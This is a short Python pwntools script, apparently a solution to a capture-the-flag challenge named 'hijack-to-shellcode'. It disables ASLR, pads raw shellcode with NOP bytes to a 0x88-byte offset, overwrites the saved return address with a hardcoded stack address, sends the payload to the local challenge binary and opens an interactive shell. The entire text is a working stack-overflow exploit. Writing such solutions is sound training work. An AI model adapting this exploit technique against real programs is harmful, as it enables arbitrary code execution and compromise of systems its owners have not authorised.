from pwn import *

context.binary = '/challenge/binary-exploitation-hijack-to-shellcode'
context.aslr = False   # 🔥 disable ASLR for this process

r = process(context.binary.path)

shell_adress = 0x00007fffffffcd50
ofsset = 0x80 + 8
f = open('shellcode-raw','rb') 
shell = f.read()
# print(shell)
print(str(len(shell)))
shell = shell.ljust(ofsset, b'\x90')
payload =  shell +  p64(shell_adress)
payload = payload.ljust(0x1000, b'\x00')

g = open('./pater', 'wb')
g.write(payload)
print(r.recv(timeout=2).decode())
r.send(payload)
print(r.recv(timeout=2).decode())
# r.send(b'\n')
r.interactive()
